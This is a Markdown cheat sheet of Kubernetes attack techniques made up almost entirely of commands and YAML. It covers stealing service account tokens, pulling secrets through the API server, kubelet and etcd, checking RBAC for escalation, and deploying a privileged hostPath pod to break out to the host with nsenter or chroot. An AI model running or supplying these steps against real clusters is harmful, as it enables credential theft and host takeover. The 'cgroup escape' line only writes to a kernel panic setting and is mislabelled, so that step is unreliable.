# Kubernetes Attacks

## 1. API Server Access
```bash
# Default service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/pods
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

## 2. Kubelet Access
```bash
curl -sk https://target:10250/pods
curl -sk https://target:10250/run/default/pod/container/command
curl -sk https://target:10250/runningpods/
```

## 3. etcd Access
```bash
# Direct etcd access
etcdctl --endpoints=https://target:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key get / --prefix --keys-only
```

## 4. Service Account Token Abuse
```bash
# Mount service account
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/$NS/secrets
```

## 5. RBAC Escalation
```bash
# Check permissions
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets
kubectl auth can-i create clusterrolebindings
```

## 6. Privileged Pod
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker
spec:
  containers:
  - name: attacker
    image: alpine
    command: ["/bin/sh", "-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
```

## 7. Host Network/PID
```yaml
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: attacker
    image: alpine
    command: ["nsenter", "--mount=/proc/1/ns/mnt", "--", "/bin/sh"]
```

## 8. Secret Extraction
```bash
kubectl get secrets -A
kubectl get secret secret-name -o json
kubectl get secret secret-name -o jsonpath='{.data.key}' | base64 -d
```

## 9. ConfigMap Extraction
```bash
kubectl get configmaps -A
kubectl get configmap config-name -o yaml
```

## 10. Container Escape
```bash
# If privileged
mount /dev/sda1 /mnt
chroot /mnt
# If hostPID
nsenter --mount=/proc/1/ns/mnt -- /bin/sh
# cgroup escape
echo 1 > /proc/sys/kernel/panic
```

## 11. Dashboard Exposure
```bash
curl -sk https://target:3000/
# Default token auth
```

## 12. Helm Tiller
```bash
# Helm 2 Tiller
helm --host tiller-deploy.kube-system:44134 list
```

## Tools
```bash
# kube-hunter
kube-hunter --remote target
# kubeaudit
kubeaudit all
# kubectl
kubectl get all -A
kubectl get secrets -A
```
